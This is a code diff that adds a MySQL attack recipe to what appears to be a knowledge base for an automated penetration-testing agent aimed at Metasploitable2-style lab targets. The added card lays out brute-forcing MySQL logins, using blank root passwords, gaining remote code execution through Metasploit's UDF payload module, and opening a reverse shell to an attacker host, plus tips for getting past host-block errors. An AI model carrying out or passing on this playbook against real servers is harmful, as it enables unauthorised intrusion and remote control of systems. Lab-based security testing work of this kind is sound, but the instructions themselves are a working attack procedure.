@@ -299,6 +299,42 @@ def main():
     # =====================================================================
     # RECEITAS POR SERVICO (Metasploitable2 e alvos Linux/Unix classicos)
     # =====================================================================
+    cards.append(format_tactical_card(
+        name="attack_guide_mysql",
+        keywords="mysql port 3306 mysql_login mysql_udf_payload root blank password host is blocked max_connect_errors target payload linux windows",
+        description="MySQL (3306): credential test, UDF RCE, OS-aware TARGET/PAYLOAD, host-block pitfall.",
+        instructions="""
+        TRIGGER: Port 3306 OPEN, banner like "MySQL 5.x" (e.g. 5.0.51a).
+        STEP 1 - CREDENTIALS: strategy brute_force with
+        auxiliary/scanner/mysql/mysql_login. The root account may have a BLANK
+        password; an empty password '' is VALID (not "missing"). The pipeline
+        sends a blank value correctly.
+        STEP 2 - RCE (once you have mysql creds): exploit/multi/mysql/mysql_udf_payload.
+          REQUIRED OPTIONS (JSON "options"):
+            "USERNAME": "root"
+            "PASSWORD": "<the found password, or '' if blank>"
+            "TARGET":   <index that MATCHES the recon "TARGET OS": pick the Linux
+                         target when OS is Linux, the Windows target when Windows.
+                         This module's default TARGET is Windows, so you MUST set
+                         it to the Linux target on a Linux host.>
+            "PAYLOAD":  <match the OS/TARGET: Linux -> "linux/x86/shell_reverse_tcp"
+                         or "generic/shell_reverse_tcp"; do NOT use cmd/unix/reverse
+                         (it is "not a compatible payload" for the Linux target).
+                         Windows -> a "windows/..." payload.>
+            "LHOST": "<attacker>", "LPORT": "4444"
+        PITFALL - HOST BLOCKED: if MySQL replies "Host '...' is blocked because of
+        many connection errors" (HostIsBlocked), the server tripped
+        max_connect_errors from too many failed attempts. You do NOT control the
+        target and cannot reset it from outside: STOP retrying MySQL in a loop and
+        move to OTHER services/ports. (ONLY if you already hold a shell on the host
+        via another service can you run 'mysqladmin flush-hosts' or SQL 'FLUSH
+        HOSTS;' to clear it.)
+        PITFALL - CONNECTION TIMEDOUT: typically the same connection-error pressure
+        or a slow DB, NOT something a bigger timeout fixes; back off instead of
+        hammering, and prefer another vector.
+        """
+    ))
+
     cards.append(attack_card(
         name="attack_guide_ftp_vsftpd234",
         ports="21", banner_match='FTP banner contains "vsftpd 2.3.4"',
